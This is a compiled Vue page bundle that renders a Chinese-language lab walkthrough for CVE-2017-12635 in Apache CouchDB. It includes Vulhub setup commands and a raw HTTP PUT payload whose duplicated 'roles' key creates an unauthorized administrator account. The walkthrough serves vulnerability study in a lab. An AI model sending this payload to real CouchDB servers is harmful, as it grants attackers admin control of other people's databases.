import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as s,c as l,a as e,b as n,d as a,e as o}from"./app-58e4a7d6.js";const u={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c=e("p",null,'Apache CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。',-1),v=e("p",null,"在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。",-1),b=e("p",null,"参考链接：",-1),p={href:"http://bobao.360.cn/learning/detail/4716.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html",target:"_blank",rel:"noopener noreferrer"},h=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Couchdb 小于 1.7.0 以及 小于 2.1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及启动环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:5984/_utils/</code>即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip:5984/_users/org.couchdb.user:vulhub</code>，如果出现404错误：<code>{&quot;error&quot;:&quot;not_found&quot;,&quot;reason&quot;:&quot;Database does not exist.&quot;}</code>，则说明当前Couchdb的初始化未完成，数据库不存在，需要手动进行配置。</p><p>Vulhub目录下存在init.sh文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>┌──(root💀kali)-[/home/…/vulnerability/vulhub/couchdb/CVE-2017-12635]
└─# cat init.sh
#!/bin/bash

COUCHDB_URL=\${COUCHDB_URL:-&quot;couchdb:5984&quot;}
COUCHDB_AUTH=\${COUCHDB_AUTH:-&quot;admin:password&quot;}

while ! curl -m 5 &quot;\${COUCHDB_URL}&quot;; do
    sleep 1
done

curl -X PUT http://\${COUCHDB_AUTH}@\${COUCHDB_URL}/_users
curl -X PUT http://\${COUCHDB_AUTH}@\${COUCHDB_URL}/_replicator
curl -X PUT http://\${COUCHDB_AUTH}@\${COUCHDB_URL}/_global_changes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>依次执行命令，初始化Couchdb，新建<code>_users</code>、<code>_replicator</code>、<code>_glocal_changes</code>三个数据库：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X PUT http://admin:password@192.168.174.128:5984/_users 
curl -X PUT http://admin:password@192.168.174.128:5984/_replicator
curl -X PUT http://admin:password@192.168.174.128:5984/_global_changes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221005221.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>配置完成后，发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90

{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;vulhub&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;password&quot;: &quot;vulhub&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221006605.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，返回403错误：<code>{&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;}</code>，只有管理员才能设置Role角色</p><p>发送包含两个roles的数据包，即可绕过限制：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;vulhub&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;roles&quot;: [],
  &quot;password&quot;: &quot;vulhub&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功创建管理员，账户密码均为<code>vulhub</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221007617.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221009954.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,23);function g(_,q){const i=d("ExternalLinkIcon");return s(),l("div",null,[r,c,v,b,e("ul",null,[e("li",null,[e("a",p,[n("http://bobao.360.cn/learning/detail/4716.html"),a(i)])]),e("li",null,[e("a",m,[n("https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"),a(i)])])]),h])}const f=t(u,[["render",g],["__file","Apache CouchDB 垂直权限绕过漏洞 CVE-2017-12635.html.vue"]]);export{f as default};
